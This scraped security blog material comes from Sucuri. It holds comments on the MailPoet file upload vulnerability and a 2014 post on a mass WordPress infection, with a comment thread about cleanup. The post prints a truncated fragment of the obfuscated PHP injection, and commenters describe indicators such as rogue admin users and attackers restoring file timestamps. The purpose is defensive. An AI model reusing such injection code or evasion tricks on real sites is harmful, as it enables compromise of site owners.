    We had this, although the entry point was similar the resulting “mess” was different. In our case it changed many files and didn’t show as a “problem” immediately because the site continued to work with issue. Only Googlebot was affected for us, but that was enough for us to be delisted… <http://www.coolsmartphone.com/2014/07/25/how-we-got-hacked-and-how-we-fixed-it/>
19. ![](https://secure.gravatar.com/avatar/d77ef5f19a12d5256c9f07b71eba616f?s=60&d=mm&r=g) **Gerard** says: [July 30, 2014 at 12:36 pm](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-6035)

    A few day’s ago I heard about the Remote File Upload Vulnerability in the WordPress MailPoet Plugin.

    So I used the “http://sitecheck.sucuri.net/” webscanner.

    The Sucuri webscanner did not detect any problems..

    The websitewas clean. Today I heard there was a problem. And some vulnerability
20. ![](https://secure.gravatar.com/avatar/c29fe8a31beaeda56062e2bbec88a4a7?s=60&d=mm&r=g) **[Pledged Plugins](http://pledgedplugins.com)** says: [July 30, 2014 at 3:55 pm](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-3666)

    Very good job identifying this vulnerability. We really like the pro-tip about not using admin\_unit() and is\_admin() as auth methods. Pledged Plugins as posted a follow up to your article on our blog at <http://pledgedplugins.com/thousands-wordpress-websites-affected-mailpoet-vulnerability/>
     Keep up the good work and we will keep recommending your services.
21. ![](https://secure.gravatar.com/avatar/91d6b97a5865bcc1a9025c345efd599e?s=60&d=mm&r=g) **Endless Geek** says: [August 9, 2014 at 7:50 am](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-3667)

    Does the http request that exploits this vuln look significantly different from a benign request? Does anyone have a packet capture of a dodgy request as I’m still trying to fingerprint this.
22. ![](https://secure.gravatar.com/avatar/47b9f29b68e63e104979389d2471519a?s=60&d=mm&r=g) **Juanma** says: [September 14, 2014 at 5:58 pm](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-3669)

    Hi, my web is in the google blacklist and I don’t know why. I use the MailPoet plugin but it seems I haven’t been atacked. Now I have disabled it. Do you think that the vulnerability of the plugin could be a reason to be included to the blacklist or it’s due to another reason? I have searched in my code and database a lot but I didn’t find injected code and google doesn’t give me detailed information.
23. ![](https://secure.gravatar.com/avatar/c0ac4089e9e5fd395ff6f9ef7ab4cb77?s=60&d=mm&r=g) **[Philipwarner](http://www.affordablebookkeepingcontractor.com.au/)** says: [January 6, 2015 at 3:28 am](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-3670)

    An attacker may leverage this issue to upload arbitrary files to the
     affected computer. If we have this plugin activated on our website, the odds are not in our favor.

Comments are closed.

##### Related Categories

* [Vulnerability Disclosure](https://blog.sucuri.net/category/vulnerability-disclosure)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)
##### You May Also Like

 ![Fake WordPress Plugin SiteSpeed Hosts Malicious Ads & Backdoors](https://blog.sucuri.net/wp-content/uploads/2020/07/plugin-backdoors-390x183.png)

* [Sucuri Labs](https://blog.sucuri.net/category/sucuri-labs)
* [Website Security](https://blog.sucuri.net/category/website-security)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [Fake WordPress Plugin SiteSpeed Serves Malicious Ads & Backdoors](https://blog.sucuri.net/2020/07/fake-wordpress-plugin-sitespeed-malware-backdoors.html)

* [![](https://secure.gravatar.com/avatar/df2487806812cf3a45af64a37a1e0daf?s=20&d=mm&r=g)Krasimir Konov](https://blog.sucuri.net/author/krasimir "View all posts by Krasimir Konov")
* July 16, 2020
 Fake WordPress plugins appear to be trending as an effective way of establishing a foothold on compromised websites. During a recent investigation, we discovered a…  [Read the Post](https://blog.sucuri.net/2020/07/fake-wordpress-plugin-sitespeed-malware-backdoors.html)  ![Labs Note](https://blog.sucuri.net/wp-content/uploads/2020/07/sucuri-labs-og-abstract-1-390x205.png)

* [Sucuri Labs](https://blog.sucuri.net/category/sucuri-labs)
* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [Backdoor plugin hides from view](https://blog.sucuri.net/2019/07/backdoor-plugin-hides-from-view.html)

* [![](https://secure.gravatar.com/avatar/b020abf59d6245e6b2a4635063322498?s=20&d=mm&r=g)Luke Leal](https://blog.sucuri.net/author/luke "View all posts by Luke Leal")
* July 24, 2019
 One of the most important traits for backdoors is the ability to remain undetected by most users — otherwise it may draw suspicion and be…  [Read the Post](https://blog.sucuri.net/2019/07/backdoor-plugin-hides-from-view.html)  ![DDoS Targeting WordPress Search](https://blog.sucuri.net/wp-content/uploads/2019/03/03292019-ddos-targeting_blog-390x183.jpg)

* [Security Advisory](https://blog.sucuri.net/category/security-advisory)
* [Security Education](https://blog.sucuri.net/category/security-education)
* [Website Security](https://blog.sucuri.net/category/website-security)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [DDoS Targeting WordPress Search](https://blog.sucuri.net/2019/04/ddos-targeting-wordpress-search.html)

* [![](https://secure.gravatar.com/avatar/e8d11f82b3d1cc308c2bf92596538bc4?s=20&d=mm&r=g)Northon Torga](https://blog.sucuri.net/author/northon "View all posts by Northon Torga")
* April 8, 2019
 Have you ever stopped to think about how many resources a search engine has or if your website could handle the same amount of search…  [Read the Post](https://blog.sucuri.net/2019/04/ddos-targeting-wordpress-search.html)  ![Fake Browser Updates Push Ransomware and Bank Malware](https://blog.sucuri.net/wp-content/uploads/2019/02/02282019-fake-browser-updates-push-ransomware-and-bank-malware_blog-390x183.png)

* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [Website Security](https://blog.sucuri.net/category/website-security)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [Fake Browser Updates Push Ransomware and Bank Malware](https://blog.sucuri.net/2019/02/fake-browser-updates-push-ransomware-and-bank-malware.html)

* [![](https://secure.gravatar.com/avatar/c9ef50b85bd345ea4e0d8da558816f3d?s=20&d=mm&r=g)Denis Sinegubko](https://blog.sucuri.net/author/denis "View all posts by Denis Sinegubko")
* February 28, 2019
 Recently we came across a malicious campaign injecting scripts that push fake browser updates onto site visitors. This is what a typical fake update request…  [Read the Post](https://blog.sucuri.net/2019/02/fake-browser-updates-push-ransomware-and-bank-malware.html)  ![Stored XSS in MyBB](https://blog.sucuri.net/wp-content/uploads/2019/03/03132019-insufficient-privilege-validation-in-siteground-optimizer-and-caldera-forms-pro_blog-390x183.jpg)

* [Vulnerability Disclosure](https://blog.sucuri.net/category/vulnerability-disclosure)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [Insufficient Privilege Validation in SiteGround Optimizer & Caldera Forms Pro](https://blog.sucuri.net/2019/03/vulnerability-disclosure-siteground-optimizer-caldera-forms.html)

* [![](https://secure.gravatar.com/avatar/8612a64e0ed5b9e586b548a984073120?s=20&d=mm&r=g)Marc-Alexandre Montpas](https://blog.sucuri.net/author/marc "View all posts by Marc-Alexandre Montpas")
* March 13, 2019
 While investigating the SiteGround Optimizer and Caldera Forms Pro plugins we have discovered a critical privilege escalation vulnerability. It was not being abused externally and…  [Read the Post](https://blog.sucuri.net/2019/03/vulnerability-disclosure-siteground-optimizer-caldera-forms.html)  ![WordPress Vulnerability Detail](https://blog.sucuri.net/wp-content/uploads/2019/03/vulnerability-details-wp_blog-390x183.jpg)

* [Vulnerability Disclosure](https://blog.sucuri.net/category/vulnerability-disclosure)
* [Website Security](https://blog.sucuri.net/category/website-security)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [Dissecting the WordPress 5.2.3 Update](https://blog.sucuri.net/2019/09/dissecting-the-wordpress-5-2-3-update.html)

* [![](https://secure.gravatar.com/avatar/8612a64e0ed5b9e586b548a984073120?s=20&d=mm&r=g)Marc-Alexandre Montpas](https://blog.sucuri.net/author/marc "View all posts by Marc-Alexandre Montpas")
* September 13, 2019
 Last week, WordPress released version 5.2.3 which was a security and maintenance update, and as such, contained many security fixes. Part of our day to…  [Read the Post](https://blog.sucuri.net/2019/09/dissecting-the-wordpress-5-2-3-update.html)  ![How to Scan WordPress for Vulnerabilities](https://blog.sucuri.net/wp-content/uploads/2021/05/WPScan-Scan-for-Vulns1-390x183.png)

* [Security Education](https://blog.sucuri.net/category/security-education)
* [Website Security](https://blog.sucuri.net/category/website-security)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [WPScan Intro: How to Scan for WordPress Vulnerabilities](https://blog.sucuri.net/2023/12/wpscan-intro-how-to-scan-for-wordpress-vulnerabilities.html)

* [![](https://secure.gravatar.com/avatar/a3ef43c4765fe447a305b82f38ea7bd1?s=20&d=mm&r=g)Rianna MacLeod](https://blog.sucuri.net/author/rianna "View all posts by Rianna MacLeod")
* December 12, 2023
 In this post, we will look at how to use WPScan as a WordPress vulnerability scanner. This security tool provides you with a better understanding…  [Read the Post](https://blog.sucuri.net/2023/12/wpscan-intro-how-to-scan-for-wordpress-vulnerabilities.html)  ![Labs Note](https://blog.sucuri.net/wp-content/uploads/2020/07/sucuri-labs-og1-390x181.png)

* [Sucuri Labs](https://blog.sucuri.net/category/sucuri-labs)
* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [Reversed URLs Randomly Redirect to Scams](https://blog.sucuri.net/2017/12/reversed-urls-randomly-redirect-to-scams.html)

* [![](https://secure.gravatar.com/avatar/c9ef50b85bd345ea4e0d8da558816f3d?s=20&d=mm&r=g)Denis Sinegubko](https://blog.sucuri.net/author/denis "View all posts by Denis Sinegubko")
* December 14, 2017
 We are seeing hundreds of infected WordPress sites with the following scripts (in one line) injected in random places in wp\_posts table. $vTB$I\_919AeEAw2z$KX=function(n){if (typeof ($vTB$I\_919AeEAw2z$KX.list[n])…  [Read the Post](https://blog.sucuri.net/2017/12/reversed-urls-randomly-redirect-to-scams.html)    ![WooCommerce Security Essentials for Store Owners](https://blog.sucuri.net/wp-content/uploads/2024/10/WooCommerce-Security-Essentials-for-Store-Owners-390x183.png)

* [Ecommerce Security](https://blog.sucuri.net/category/ecommerce-security)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [WooCommerce Security Essentials for Store Owners](https://blog.sucuri.net/2024/10/woocommerce-security-essentials-for-store-owners.html)

* [![](https://secure.gravatar.com/avatar/8fc0dcc56a9746db1eeed488e3cae1c1?s=20&d=mm&r=g)Kyle Knight](https://blog.sucuri.net/author/klknight "View all posts by Kyle Knight")
* October 10, 2024
 Running a WooCommerce store is awesome for your business – it opens up a whole world of opportunities. But let’s be honest, it also comes…  [Read the Post](https://blog.sucuri.net/2024/10/woocommerce-security-essentials-for-store-owners.html)  ![Labs Note](https://blog.sucuri.net/wp-content/uploads/2020/07/sucuri-labs-og1-390x181.png)

* [Security Advisory](https://blog.sucuri.net/category/security-advisory)
* [Vulnerability Disclosure](https://blog.sucuri.net/category/vulnerability-disclosure)

## [Vulnerable Plugins: June 2020 Update](https://blog.sucuri.net/2020/06/vulnerable-plugins-june-mid-month-update.html)

* [![](https://secure.gravatar.com/avatar/14e8a81f8c7c18715d660025d52ce68a?s=20&d=mm&r=g)John Castro](https://blog.sucuri.net/author/john "View all posts by John Castro")
* June 19, 2020
 This is a mid-month update to our regular Monthly Vulnerability Digest, which reveals a number of new patches for disclosed vulnerabilities. Plugin Vulnerability Patched Version…  [Read the Post](https://blog.sucuri.net/2020/06/vulnerable-plugins-june-mid-month-update.html)
##### Search

 Search for:  Search[![WordPress Security Guide Sidebar](https://blog.sucuri.net/wp-content/uploads/2024/02/WordPress-Security-Guide-Sidebar.jpg)](https://sucuri.net/guides/wordpress-security/)[![](https://blog.sucuri.net/wp-content/uploads/2023/04/23-sucuri-newsletter-blog-banner.png)](https://info.sucuri.net/subscribe-to-security)[![Sucuri Sidebar Malware Removal to Signup Page](https://blog.sucuri.net/wp-content/uploads/2023/08/23-sucuri-blog-sidebar-banner-need-help-cleaning-up-malware-on-your-website-get-help-now-new.png)](https://sucuri.net/website-security-platform/signup/) ![Sucuri Logo](https://sucuri.net/wp-content/uploads/2022/12/sucuri_logo_dark.svg)

Let’s Connect

        [Products](https://sucuri.net/website-security/)   [Website Firewall](https://sucuri.net/website-firewall/)   [Website Security Platform](https://sucuri.net/website-security-platform/)   [WordPress Security](https://sucuri.net/wordpress-security/)   [Website Backups](https://sucuri.net/website-backups/)   [Hack Assistance](https://sucuri.net/website-security-platform/help-now/)   [Pricing](https://sucuri.net/website-security-platform/signup)   [Solutions](https://sucuri.net/ddos-protection/)   [DDoS Protection](https://sucuri.net/ddos-protection/)   [Malware Detection](https://sucuri.net/malware-detection-scanning/)   [Malware Removal](https://sucuri.net/website-malware-removal/)   [Malware Prevention](https://sucuri.net/website-hack-protection/)   [Blacklist Removal](https://sucuri.net/website-security-platform/blocklist-removal-and-repair/)   [SEO Spam Removal](https://sucuri.net/seo-spam-removal/)  USE CASES  [Developers](https://sucuri.net/developers/)   [Ecommerce](https://sucuri.net/ecommerce-website-security/)   [Agency Plans](https://sucuri.net/custom/agency/)   [Enterprise Services](https://sucuri.net/custom/agency/)   [HTTPS/2](https://sucuri.net/http-2-rapid-reset/)   [Virtual Patching](https://sucuri.net/virtual-patching/)   [Support](https://docs.sucuri.net/)   [Knowledge Base](https://docs.sucuri.net/)   [SiteCheck](https://sitecheck.sucuri.net/)   [Guides](https://sucuri.net/guides/)   [Research Labs](https://labs.sucuri.net/)   [Report Abuse](https://abuse.sucuri.net/)   [Status Report](https://status.sucuri.net/)   [Company](https://sucuri.net/company/)   [About Sucuri](https://sucuri.net/company/)   [Contact](https://sucuri.net/company/contact-us/)   [Blog](https://blog.sucuri.net/)   [Referral](https://sucuri.net/referral/)   [Partners](https://sucuri.net/partners/)   [Testimonials](https://sucuri.net/customers/)  [Terms of Use](https://sucuri.net/terms/) [Privacy Policy](https://sucuri.net/privacy/) [Do Not Sell My Personal Information](https://sucuri.net/cookies/) [Frequently Asked Questions](https://sucuri.net/faq/)

© 2025 GoDaddy Mediatemple, Inc., d/b/a Sucuri. All rights reserved.

   [back to top](#top "Going Top")  X

Sucuri Cookie Policy
 [See our policy>>](https://sucuri.net/cookies)

Our website uses cookies, which help us to improve our site and enables us to deliver the best possible service and customer experience.

 Accept Decline Manage Options

=== Content from blog.sucuri.net_0296cbc3_20250125_223244.html ===
  [![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)
     [![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)

* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
 [Login](https://dashboard.sucuri.net/login/)       [Login](https://dashboard.sucuri.net/login)

New Customer?

[Sign up now.](https://sucuri.net/website-security-platform/signup/)

* [Submit a ticket](https://support.sucuri.net/support/?new)
* [Knowledge base](https://docs.sucuri.net/)
* [Chat now](https://sucuri.net/live-chat/)
 Search for:  Search

* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)
# Massive Malware Infection Breaking WordPress Sites

  [![](https://secure.gravatar.com/avatar/aae9e45052caab7d92b7a32b89a4ab22?s=60&d=mm&r=g)](https://blog.sucuri.net/author/peter)   [Peter Gramantik](https://blog.sucuri.net/author/peter)

* July 22, 2014

**Update:** We identified the root cause: [MailPoet Vulnerability Exploited in the Wild – Breaking Thousands of WordPress Sites](https://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html).

The last few days has brought about a massive influx of broken WordPress websites. What makes it so unique is that the malicious payload is being blindly injected which is causing websites to break. While we’re still researching, we do want to share share some observations:

1. This infection is aimed at websites built on the popular WordPress CMS.
2. It is targeting sites with outdated (vulnerable) plugins or weak admin passwords.
3. Malware is highly obfuscated and attempts to inject SPAM to the hacked website.

There is, however, one very unpleasant impact of this infection. The infector PHP code is buggy and corrupting legitimate website files. It is targeting not only the core WordPress files, but also theme and plugins files. The results are various PHP errors being displayed instead of the normal site content. If you see this error on your site…

> Parse error: syntax error, unexpected ‘)’ in /home/user/public\_html/site/wp-config.php on line 91

… it means your site is likely hacked. Our [sitecheck](http://sitecheck.sucuri.net) scanner will warn of this error as well:

[![corruptedsite](https://blog.sucuri.net/wp-content/uploads/2014/07/corruptedsite-150x150.png)](https://blog.sucuri.net/wp-content/uploads/2014/07/corruptedsite.png)

The only known solution (after removal of injected malware)is restoring these corrupted files from a clean backup. If you are curious about the malware injection, this is what it looks like (it is randomly generated):

> <?php $pblquldqei = ‘5c%x7824-%x5c%x7824\*!|!%x5c%x7824-%x5c%x7824%x5c%x785c%x5c%x7825j^%xq%x5c%x7825%x5c%x7827Y%x5c%x78256<.msv%x5c%x7860ftsbqA7>q7825)3of:opjudovg<~%x5c%x7824<!%x5c%x7825o:!>!%x5c%x782421787825!|!\*!\*\*\*b%x5c%x7825)…

We’ll continue the investigation and will provide more details as they become available. If you suspect you have been impacted by this infection [rest assured that our team is ready and actively cleaning this mess up](https://sucuri.net/services/malware-removal) on all websites.

  [![](https://secure.gravatar.com/avatar/aae9e45052caab7d92b7a32b89a4ab22?s=120&d=mm&r=g)](https://blog.sucuri.net/author/peter)
##### [Peter Gramantik](https://blog.sucuri.net/author/peter)

Peter Gramantik is Sucuri’s Sr. Malware Researcher who joined the company in 2013. Peter’s main responsibilities include crafting signatures for new malware, and improving existing and researching new detection techniques. His professional experience covers 15 years of fighting malware. When Peter isn’t researching malware, you might find him doing technical and cave dives, riding his Harley Davidson, playing the guitar and singing in a band, or cooking BBQ for his family and friends. Connect with Peter on [Twitter](https://twitter.com/petergramantik).

##### Related Tags

* [WordPress Plugins and Themes](https://blog.sucuri.net/tag/wordpress-plugins-and-themes)
##### 83 comments

1. ![](https://secure.gravatar.com/avatar/d3791560c3a1d1a194f2456b07a3a1fe?s=60&d=mm&r=g) **MrsJohnson** says: [July 22, 2014 at 12:52 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3731)

   I have had five sites that have been compromised over the past few days that sound markedly similar to this. When cleaning I found that once I removed the code that it was giving parsing errors. I found that randomly (or so it seems) the last 20 characters of a php file is being duplicated at the end of the file, sometimes adding endif or closes that aren’t supposed to be there which caused parse errors. In the five sites that were compromised each php file had injected code and only a handful (maybe 10) of files had the additional code at the end of the file.

   1. ![](https://secure.gravatar.com/avatar/6e62addf18eade1227f3c78b4c4ed534?s=60&d=mm&r=g) **perezbox** says: [July 22, 2014 at 1:03 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3732)

      Yes, exactly. That’s the same thing we’re seeing. It’s really nasty and annoying.

      1. ![](https://secure.gravatar.com/avatar/d3791560c3a1d1a194f2456b07a3a1fe?s=60&d=mm&r=g) **MrsJohnson** says: [July 22, 2014 at 1:05 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3733)

         There also seems to be a backdoor somewhere. I cleaned up the original site three days ago and all seemed to be well, but it was reinfected less than 72 hours later. I may have missed a file, but I’m not sure, I’ve cleaned it and locked it down again and now I wait. Nothing in the database that I found so far.

         1. ![](https://secure.gravatar.com/avatar/0fd09c8a039ee38501db831faeec2984?s=60&d=mm&r=g) **Trev** says: [July 22, 2014 at 4:57 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3743)

            Check your users, I found a blank one in there.

            1. ![](https://secure.gravatar.com/avatar/d3791560c3a1d1a194f2456b07a3a1fe?s=60&d=mm&r=g) **MrsJohnson** says: [July 22, 2014 at 5:39 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3744)

               Thanks Trev, I thought of that too. I didn’t see anything in mine, searched for the common eval and decode strings in the DB too. After this last fight with it we’re about 20 hours in and going strong so far, I changed every password that existed and I even changed the WP passwords through PHPmyAdmin. This has made me pretty paranoid even though I have good backups. I’m hoping we’re in the clear now and the last reinfection was an oversight on my part during the original cleanup.
            2. ![](https://secure.gravatar.com/avatar/c9ef50b85bd345ea4e0d8da558816f3d?s=60&d=mm&r=g) **Denis Sinegubko** says: [July 22, 2014 at 5:46 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3746)

               Yes. Most of them have a rogue admin user with blank name and user ID 1001001 (in case you are checking the DB)
         2. ![](https://secure.gravatar.com/avatar/2647946cc8336d955aa2c498d66b9a7e?s=60&d=mm&r=g) **Tristan** says: [July 23, 2014 at 2:13 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3767)

            be sure to check the file wp-admin/admin-post.php
             or search through your .php files for the term $cookey you will probably find some more junk to remove. I too had removed what I thought was all the offending code/changed pw and was still re-infected.

            also obviously make sure you remove mailpoet.

            1. ![](https://secure.gravatar.com/avatar/d3791560c3a1d1a194f2456b07a3a1fe?s=60&d=mm&r=g) **MrsJohnson** says: [July 23, 2014 at 2:31 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3768)

               Yup, I completely deleted and replaced all core files. I only manually cleaned the theme and/or custom plugins that were being worked on (development sites). I never even looked inside those files past the general look to see if they were all affected. I think it’s all taken care of now.
   2. ![](https://secure.gravatar.com/avatar/aae9e45052caab7d92b7a32b89a4ab22?s=60&d=mm&r=g) **Peter Gramantik** says: [July 22, 2014 at 1:08 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3734)

      Hi, yes, this is very likely same infection. Unfortunately, not all files have this duplicated part of code appended (it’s always constant count of chars within one infection) but we’re seeing also duplicated code in the middle of files, etc. Unfortunately, this seems to be very buggy infection. That’s why restore is recommended right now. We’re performing further investigation..

      1. ![](https://secure.gravatar.com/avatar/d3791560c3a1d1a194f2456b07a3a1fe?s=60&d=mm&r=g) **MrsJohnson** says: [July 22, 2014 at 1:11 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3735)

         I totally understand that 🙂 I have a very limited set to base my assumptions from (5 sites is a drop in the bucket) – so far I haven’t ran into any in the middle of code, but I have been restoring all the files that I have been able to (core files, plugin files) the only files I’ve had to try to clean manually have been some customized theme files.
2. ![](https://secure.gravatar.com/avatar/90399da9775496a3886dba44f94d92d3?s=60&d=mm&r=g) **[Adam H](http://www.rivmedia.co.uk/)** says: [July 22, 2014 at 1:12 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3736)

   We have Wordfence installed along with renaming the wp-login.php, ive seen massive increases in blocked access attempts and excessive requests, we use wordfence to block more than 5 404 hits in less than 30 seconds, this prevents the majority of vulnerable plugin scanning and wp-admin login attempts because of the way its setup. Between Saturday and today there has been a huge amount of attempts as wordpress is also setup to send emails on blocks, user logins and file edits.

   1. ![](https://secure.gravatar.com/avatar/ab1389c26a044a10bdf8890f81fe9835?s=60&d=mm&r=g) **ThomasBorger** says: [July 22, 2014 at 2:24 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3738)

      We’ve noticed this too, started a couple weeks ago. Such an uptick that I had to decrease the number of notification emails I get.

      1. ![](https://secure.gravatar.com/avatar/90399da9775496a3886dba44f94d92d3?s=60&d=mm&r=g) **[Adam H](http://www.rivmedia.co.uk/)** says: [July 22, 2014 at 3:25 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3739)

         Funny thing is 10 mins after commenting on this post our server started mass mailing, someone obviously saw my comment and thought they’d have a proper go at it. Guess thats my night now taken up. Wont be tempting fate and commenting on this blog again.
3. ![](https://secure.gravatar.com/avatar/509ef7132c62ab77223b43c4c1a3630f?s=60&d=mm&r=g) **[Jim Walker](http://hackrepair.com/)** says: [July 22, 2014 at 1:14 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3737)

   Sadly I concur on this. Had me hopping all weekend as “help!” calls streamed in regarding website’s with broken home pages and the like. Quite a bear to recover as well. The hacker coding is randomized and sloppy coding injections are being made to the header of most files.

   Again, driving home the importance of maintaining a good daily and weekly backup folks…

   1. ![](https://secure.gravatar.com/avatar/d28241c73c06fb1b7766e8b12c03a416?s=60&d=mm&r=g) **[WatWebDev.com](http://watwebdev.com/)** says: [September 12, 2014 at 2:55 am](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3788)

      Backups without security is like fish without water. You need to ensure your system is fully clean by quarantining every file that enters and checking all files regularly. No matter how many times you backup, if you are infected, you are just backing up infected files. If you do not find out about the attack for a month or so, you could have no backups left that are not infected.
4. ![](https://secure.gravatar.com/avatar/110e5b52f6c5d95b64653434cef61dae?s=60&d=mm&r=g) **James Giroux** says: [July 22, 2014 at 4:36 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3740)

   Sitecheck doesn’t always pick it up. The best thing to do is to go in and open up your wp-config file and check it out. If it’s got that random code at the top $ad;flkajsf=asdjfhaskdjfasd;lfkj then it’s infected.

   1. ![](https://secure.gravatar.com/avatar/c9ef50b85bd345ea4e0d8da558816f3d?s=60&d=mm&r=g) **Denis Sinegubko** says: [July 22, 2014 at 5:44 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3745)

      This one affects multiple files, not only wp-config.php. Just finished cleaning a site where the list of cleaned files contained over 2,000 items (of course this depends on the number of plugins and themes you use)

      1. ![](https://secure.gravatar.com/avatar/110e5b52f6c5d95b64653434cef61dae?s=60&d=mm&r=g) **James Giroux** says: [July 22, 2014 at 5:46 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3747)

         Yeah, I just picked an easy file for people to find. I can’t imagine what it must be like at Sucuri right now. I’ve got two different clients in two different environments dealing with this. Any idea what plugin/theme/files are more vulnerable?

         1. ![](https://secure.gravatar.com/avatar/c9ef50b85bd345ea4e0d8da558816f3d?s=60&d=mm&r=g) **Denis Sinegubko** says: [July 22, 2014 at 5:55 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3748)

            We don’t have full information yet (a few plugins suspected) but generally you can think that having not updated version of plugins (or old unsupported themes/plugins) is a bad idea. Some times a new version of plugin mean that authors fixed some security hole (and they don’t always disclose it).

            Popular commercial themes and plugins are also at risk especially when they are not up-to-date. And, of course, blogs that have open user registrations may be an easier target (quite a few plugins has/had role escalation vulnerabilities)
   2. ![](https://secure.gravatar.com/avatar/7d535e5ce44547dc3a45931154718f8c?s=60&d=mm&r=g) **[Nikolas Branis](http://kanenas.net)** says: [July 22, 2014 at 7:18 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3749)

      Is it possible to write on a wp-config.php file with permissions 444?

      1. ![](https://secure.gravatar.com/avatar/c9ef50b85bd345ea4e0d8da558816f3d?s=60&d=mm&r=g) **Denis Sinegubko** says: [July 22, 2014 at 7:54 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3752)

         Sure, if the infection script works with the same user permissions. Needs just chmod it before modification. (and then chmod back and touch with the original timestamp 😉
          We see it all the time.
